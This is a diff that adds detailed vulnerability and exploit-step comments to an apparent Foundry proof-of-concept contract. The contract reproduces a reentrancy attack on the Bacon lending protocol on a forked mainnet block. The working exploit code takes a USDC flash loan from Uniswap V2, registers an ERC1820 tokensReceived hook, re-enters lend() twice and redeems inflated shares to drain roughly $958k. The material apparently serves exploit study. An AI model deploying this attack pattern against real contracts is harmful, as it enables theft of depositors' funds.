@@ -12,9 +12,37 @@ contract ContractTest is Test {
     IBacon bacon = IBacon(0xb8919522331C59f5C16bDfAA6A121a6E03A91F62);
     uint256 count = 0;
 
+    // VULNERABILITY: Reentrancy via ERC1820 tokensReceived during lend() share mint (CEI violation)
+    // Root cause: Bacon's lend() does external interaction (USDC transferFrom via Amply/ERC777 wrapper)
+    // or _mint of its own ERC777-based shares (using standard ERC777 _mint which does balance update then
+    // _callTokensReceived via ERC1820 registry lookup for "ERC777TokensRecipient" hash 0xb281fc8c...) BEFORE
+    // ALL effects are committed or without a reentrancy guard (nonReentrant).
+    // The hook is invoked on the *recipient* of the minted shares (attacker), allowing reentrancy into lend().
+    // See also: Pool* lend() variants (some lack nonReentrant on lend; transferFrom then mint/poolLent+=).
+    // Why it works: reentrant lend() calls execute their transferFrom + mint path while outer call's
+    // accounting (poolLent, shares) is mid-update or multiple credits occur for overlapping deposit.
+    // Attacker's count limits to 2 reentries → 3 total lend executions for ~1 net "logical" flash deposit unit.
+    // Impact: share balance inflates (e.g. 3x), redeem drains far more USDC from pool than net deposited
+    // (attacker extracts protocol liquidity). Flash loan makes it zero-capital. Concrete harm: pool LPs
+    // / depositors lose funds to attacker (drain of available USDC liquidity).
+    // Evidence: uniswapV2Call + tokensReceived + redeem(balanceOf); no guard; hook before settle.
+    // EXPLOIT STEPS:
+    // 1. Register self as ERC1820 implementer for the recipient interface hash on self (constructor).
+    // 2. Flash-borrow large USDC (6.36M) from UniswapV2Pair via swap(amt,0,to,callbackData) - lands in uniswapV2Call.
+    // 3. Approve USDC to bacon; call bacon.lend(depositUnit=2.12M) — this pulls via transferFrom (or equiv) and mints shares.
+    // 4. During the internal _mint (or equiv asset receipt), ERC1820 triggers tokensReceived on attacker (to=attacker).
+    // 5. tokensReceived increments count and (while <=2) re-calls bacon.lend(same amt) — stacks 2 reentrants.
+    // 6. Each lend path contributes a share mint / credit before returning; outer sees inflated bacon.balanceOf().
+    // 7. Call bacon.redeem(allShares) — burns inflated shares, receives >> net deposited USDC (pool liquidity).
+    // 8. Repay flash: transfer required amt+fee to pair (using ((amt0/997)*1000 + 1 USDC)); skim profit to origin.
+    // 9. Profit = redeemed surplus after flash repay (attacker started with 0, ends with drained amount).
+
     constructor() {
         cheats.createSelectFork("http://127.0.0.1:8545", 14_326_931); // fork mainnet at block 14326931
 
+        // Register as implementer so that when Bacon (ERC777 shares) mints to us during lend(),
+        // the registry returns us for getInterfaceImplementer(attacker, ERC777_RECIPIENT_HASH) and
+        // Bacon's _callTokensReceived will invoke our tokensReceived (the reentrancy vector).
         ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer(
             address(this), bytes32(0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b), address(this)
         );
@@ -28,6 +56,30 @@ contract ContractTest is Test {
     }
 
     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+        // VULNERABILITY: Reentrancy in lend() via ERC1820 tokensReceived callback (missing guard + CEI)
+        // Location: Bacon (0xb8919522331C59f5C16bDfAA6A121a6E03A91F62) lend() calls transferFrom on
+        //   Amply-wrapped USDC (ERCAddress) then poolLent += + _mint (or proportional mint in deployed version).
+        //   The mint/transfer path invokes ERC1820.getInterfaceImplementer(to, AMP_HASH) and calls
+        //   tokensReceived on us (attacker) BEFORE the lend's effects (poolLent update + share balance) settle.
+        // Why vulnerable: no nonReentrant (or guard set too late), no state snapshot before external call;
+        //   reentrant lend()s see/operate on stale pool state and each perform their own transfer + credit.
+        // Impact: attacker share balance inflates (3 lends for 1 deposit unit), redeem drains excess USDC
+        //   from pool's liquidity (LPs/depositors lose the difference). ~$958k extracted in this PoC.
+        // EXPLOIT STEPS:
+        // 1. constructor: setInterfaceImplementer(this, bytes32(0xb281fc8c... "AmplyTokensRecipient"), this)
+        //    so Bacon's hook logic will dispatch tokensReceived to us during lend's mint path (L19-20).
+        // 2. test(): pair.swap(6_360_000_000_000, 0, this, bytes(1)) — Uniswap V2 sends 6.36M USDC to us
+        //    then calls uniswapV2Call (L30, L58).
+        // 3. uniswapV2Call: usdc.approve(bacon, huge); bacon.lend(2_120_000_000_000); (L62-63)
+        //    Inside lend: transferFrom(this -> bacon, 2.12M) triggers the hook on us (before or mid effects).
+        // 4. tokensReceived (first time, count=0->1): if(count<=2) bacon.lend(2.12M) — reenter (L75-78).
+        // 5. Reentrant lend #2 (count=1->2): same, transfers + credits shares, triggers hook again (L75-78).
+        // 6. Reentrant lend #3 (count=2->3): no further reenter. All 3 lends complete their mint/credit.
+        //    bacon.balanceOf(this) now reflects ~3x inflation (depending on proportional logic at block).
+        // 7. bacon.redeem( bacon.balanceOf(this) ) — burns inflated shares, receives > net deposited USDC
+        //    (L64). Pool transfers out based on shares/updated poolLent.
+        // 8. Repay: usdc.transfer(pair, (amount0/997*1000 + 1e6)); skim remainder to tx.origin (L65-66).
+        // 9. Net: flash repaid + fee, attacker keeps surplus (957786585605 USDC per logs).
         usdc.approve(address(bacon), 10_000_000_000_000_000_000);
         bacon.lend(2_120_000_000_000);
         bacon.redeem(bacon.balanceOf(address(this)));
@@ -43,6 +95,8 @@ contract ContractTest is Test {
         bytes calldata data,
         bytes calldata operatorData
     ) public {
+        // See VULNERABILITY + EXPLOIT STEPS comment in uniswapV2Call above for full trace.
+        // This function is the reentrancy entrypoint (dispatched by Bacon/ERC1820 during lend).
         count += 1;
         if (count <= 2) {
             bacon.lend(2_120_000_000_000);
